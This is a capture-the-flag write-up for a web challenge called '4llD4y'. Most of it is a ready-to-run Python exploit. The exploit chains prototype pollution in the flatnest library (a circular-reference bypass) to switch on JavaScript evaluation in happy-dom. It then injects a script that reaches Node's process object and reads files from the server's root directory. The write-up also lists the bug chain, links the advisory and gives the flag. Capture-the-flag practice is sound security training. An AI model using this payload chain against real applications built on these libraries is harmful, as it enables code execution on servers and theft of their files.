# web - 4llD4y

https://github.com/capricorn86/happy-dom/security/advisories/GHSA-qpm2-6cq5-7pq5

```
import requests, re

TARGET = "http://challenges4.ctf.sd:34160"

requests.post(f"{TARGET}/config", json={
    "proto": "[Circular (constructor.prototype)]",
    "proto.settings.enableJavaScriptEvaluation": True
})

js = "const p=this.constructor.constructor('return process')();const fs=p.getBuiltinModule('fs');const f=fs.readdirSync('/').find(x=>x.startsWith('flag_'));document.body.textContent=fs.readFileSync('/'+f,'utf8');"

r = requests.post(f"{TARGET}/render", json={"html": f"<html><body><script>{js}</script></body></html>"})
print(r.text)
```
vuln 

- flatnest direct prototype pollution
- flatnest circular reference bypass
- happy-dom settings inheritance

flag: `0xL4ugh{H4appy_D0m_4ll_th3_D4y_fbf574e2e3f38aeb}`

Solved by vicevirus

Solved by: yappare